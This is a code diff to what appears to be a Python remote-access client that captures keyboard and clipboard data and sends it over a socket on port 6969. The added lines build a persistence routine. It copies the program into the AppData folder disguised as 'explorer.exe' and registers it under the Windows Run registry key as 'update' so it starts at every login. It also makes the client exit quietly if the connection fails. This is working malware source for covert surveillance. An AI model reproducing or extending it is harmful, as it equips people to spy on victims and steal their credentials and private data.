@@ -2,10 +2,27 @@ import socket
 import keyboard
 import win32clipboard
 from colorama import Fore
+import sys, os
+import shutil
+import subprocess
 
-conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-conn.connect((socket.gethostbyname(socket.gethostname()), 6969))
+try:
+    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    conn.connect((socket.gethostbyname(socket.gethostname()), 6969))
+except Exception:
+    sys.exit()
 brackets = f"{Fore.BLUE}[{Fore.GREEN}+{Fore.BLUE}]{Fore.RESET}"
+
+def persistence():
+    storage_location = os.environ["appdata"] + "\\Windows\\explorer.exe"
+    if not os.path.exists(storage_location):
+        os.mkdir(os.environ["appdata"] + "\\Windows\\")
+        # for .py file
+        # shutil.copyfile(__file__, storage_location)
+        # for .exe file
+        shutil.copyfile(sys.executable, storage_location)
+        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d"' + storage_location + '"', shell=True)
+
 
 def get_clipboard_data():
     win32clipboard.OpenClipboard()
